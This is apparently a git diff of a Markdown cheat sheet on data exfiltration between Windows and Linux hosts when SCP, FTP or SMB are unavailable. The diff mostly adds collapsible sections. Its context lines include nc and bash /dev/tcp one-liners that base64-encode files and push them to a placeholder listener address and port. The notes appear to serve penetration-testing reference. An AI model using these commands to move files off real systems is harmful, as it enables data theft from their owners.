@@ -2,9 +2,14 @@
 #### This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc.
 
 ***
+
 ***
 
 ### Windows To Linux
+
+<details>
+
+<summary>Send a file from a remote Windows client to a local Linux host</summary>
 
 #### Send a file from a *remote* Windows client to a *local* Linux host
 
@@ -42,7 +47,13 @@ nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
+</details>
+
 ***
+
+<details>
+
+<summary>Retrieve a file from a remote Windows client to a local Linux host</summary>
 
 #### Retrieve a file from a *remote* Windows client to a *local* Linux host
 
@@ -92,10 +103,17 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
 ```
 
+</details>
+
 ***
+
 ***
 
 ### Linux To Windows
+
+<details>
+
+<summary>Send a file from a remote Linux client to a local Windows host</summary>
 
 #### Send a file from a *remote* Linux client to a *local* Windows host
 
@@ -145,7 +163,13 @@ base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
+</details>
+
 ***
+
+<details>
+
+<summary>Retrieve a file from a remote Linux client to a local Windows host</summary>
 
 #### Retrieve a file from a *remote* Linux client to a *local* Windows host
 
@@ -183,10 +207,17 @@ base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
+</details>
+
 ***
+
 ***
 
 ### Linux To Linux
+
+<details>
+
+<summary>Send file from remote Linux client to local Linux host</summary>
 
 #### Send file from *remote* Linux client to *local* Linux host
 
@@ -232,7 +263,13 @@ base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 base64 -w0 /path/to/sending/file.ext > /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
+</details>
+
 ***
+
+<details>
+
+<summary>Retrieve a file from a remote Linux client to a local Linux host</summary>
 
 #### Retrieve a file from a *remote* Linux client to a *local* Linux host
 
@@ -278,10 +315,17 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
 ```
 
+</details>
+
 ***
+
 ***
 
 ### Windows To Windows
+
+<details>
+
+<summary>Send file from remote Windows client to local Windows host</summary>
 
 #### Send file from *remote* Windows client to *local* Windows host
 
@@ -322,7 +366,13 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
+</details>
+
 ***
+
+<details>
+
+<summary>Retrieve a file from a remote Windows client to a local Windows host</summary>
 
 #### Retrieve a file from a *remote* Windows client to a *local* Windows host
 
@@ -363,3 +413,5 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+</details>
